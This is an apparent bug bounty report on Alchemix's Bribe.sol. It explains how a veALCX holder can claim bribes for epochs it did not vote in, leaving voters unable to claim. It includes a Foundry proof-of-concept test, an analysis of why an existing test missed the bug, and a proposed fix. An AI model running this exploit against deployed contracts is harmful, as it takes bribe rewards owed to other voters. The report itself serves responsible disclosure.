# 31079 - \[SC - Critical] Claiming bribes for epochs you didnt vote for l...

Submitted on May 12th 2024 at 11:10:23 UTC by @infosec\_us\_team for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31079

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Protocol insolvency

## Description

> This is a text-dense report we apologize in advance.

## Summary

This report demonstrates how a user can claim rewards for an epoch he didn't vote for, causing solvency issues as the users who voted cannot receive their share of bribes.

A coded proof of concept can be found in the POC section.

## Detailed Description

To understand the root issue, let's start by breaking down with bullet points an example:

* "**Alice**" votes in epoch `1`.
* "**Bob**" votes in epoch `1`.

***

* The second epoch (`2`) starts.

***

* "**Alice**" claims bribes from epoch `1`.
* "**Bob**" votes in epoch `2`.
* "**Bob**" claims bribes from epoch `1`.

***

* A third epoch (`3`) starts.

***

* **Alice claims bribes from epoch `2`.** (This shouldn't happen)
* "**Bob**" votes in epoch `2`.
* "**Bob**" attempts to claim bribes from epoch `2` but fails with "*ERC20: transfer amount exceeds balance*" because Alice stole rewards from epoch `2` and the Bribe became insolvent.

### Why is this happening?

When claiming Bribe rewards the code does the following:

* Reads the balance of "Alice" in the previously recorded checkpoint.
* It doesn't check if "Alice" voted in that epoch.
* Sends rewards to "Alice".
* Creates a new checkpoint and stores "Alice" 's balance.

```
function getRewardForOwner(uint256 tokenId, address[] memory tokens) external lock {
    ...
    _writeCheckpoint(tokenId, balanceOf[tokenId]);
    ...
}
```

Then it all repeats in the next epoch.

Whether it is a `veACLX` position with "**maxLock**" enabled (*where voting power never decays*) or a position that expires within a couple of epochs, everyone can claim rewards for epochs they haven't voted for as long as they have at least 1 checkpoint.

This leads to solvency issues as the users who voted cannot receive their share of bribes.

### How to solve this?

The best solution is to keep track inside the `Bribe` smart contract of every epoch that a `veACLX` lock votes for, fortunately, this is easy to implement.

A new mapping must be added to the `Bribe` smart contract like this:

```
mapping(uint256 => mapping(uint256 => bool)) public votedEpochs;
```

We only update it when a user votes/pokes like this:

```
// Record that `tokenId` voted in `epoch`
votedEpochs[epoch][tokenId] = true;
```

Then *in the `getRewardForOwner(uint256 tokenId, address[] memory tokens)` function of the `Bribe` smart contract* before sending rewards to the user, we check if the tokenId voted in the epoch that we are giving him rewards for.

### Why couldn't the `testGetRewardForOwner()` test detect this bug?

This test was introduced on April 1 to detect if users can claim rewards in past epochs they didn't vote for causing solvency issues:

```
function testGetRewardForOwner() public {
    uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);

    address bribeAddress = voter.bribes(address(sushiGauge));

    // Add BAL bribes to sushiGauge
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

    address[] memory pools = new address[](1);
    pools[0] = sushiPoolAddress;
    uint256[] memory weights = new uint256[](1);
    weights[0] = 5000;

    address[] memory bribes = new address[](1);
    bribes[0] = address(bribeAddress);
    address[][] memory tokens = new address[][](1);
    tokens[0] = new address[](1);
    tokens[0][0] = bal;

    // in epoch i, user votes with balance x
    hevm.prank(admin);
    voter.vote(tokenId1, pools, weights, 0);

    // Start second epoch i+1
    hevm.warp(newEpoch());
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

    // Claim bribes from epoch i
    hevm.prank(admin);
    voter.claimBribes(bribes, tokens, tokenId1);

    hevm.warp(newEpoch());
    hevm.prank(admin);
    hevm.expectRevert(abi.encodePacked("no rewards to claim"));
    voter.claimBribes(bribes, tokens, tokenId1);
}
```

Log the **block.timestamp** using `console2.log(block.timestamp);` after every time the test "moves the time to the next epoch".

You will realize, that it always prints the same timestamp. Time is not moving forward at all, the test always **warp**s to the present.

**But why?**

Because the definition of `newEpoch()` is:

```

function newEpoch() public view returns (uint256) {
    return IMinter(minter).activePeriod() + IMinter(minter).DURATION() + 1 seconds;
}
```

If we never update the active period of the `minter`, then "`newEpoch()`" will always return the same value.

To fix this test and actually move forward to the next timestamp, add `voter.distribute();` after the start of the second epoch like this:

```
// Start second epoch i+1
hevm.warp(newEpoch()); console2.log(block.timestamp);
voter.distribute(); // <----- inserted here
createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
```

The distribution mechanism updates the minter's active period.

Try to rerun the test. It will fail indicating that rewards can be claimed for epochs that a user has not voted for.

## Impact Details

Solvency issues as the users that voted cannot receive their share of bribes.

## Proof of Concept

This test reproduces the example given about "Bob" and "Alice", proving the solvency issues and how "Bob" can't receive his share of bribes.

```
    function testSolvencyIssue() public {

        // Create token1
        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        // Create token2
        uint256 tokenId2 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);

        address bribeAddress = voter.bribes(address(sushiGauge));
        createThirdPartyBribe(bribeAddress, bal, TOKEN_1);

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        // On epoch i, both tokenIds vote
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);
        hevm.prank(admin);
        voter.vote(tokenId2, pools, weights, 0);

        // Start epoch i+1
        hevm.warp(newEpoch());
        voter.distribute();
        createThirdPartyBribe(bribeAddress, bal, TOKEN_1);

        // Only tokenId2 votes in epoch i+1
        hevm.prank(admin);
        voter.vote(tokenId2, pools, weights, 0);

        // Both tokens claim bribes from epoch i
        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);
        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId2);

        // Start epoch i+2
        hevm.warp(newEpoch());
        voter.distribute();

        // Both tokens claim bribes from epoch i+1
        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);
        // Claim for tokenId2 reverts with:
        // "ERC20: transfer amount exceeds balance"
        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId2);

    }
```
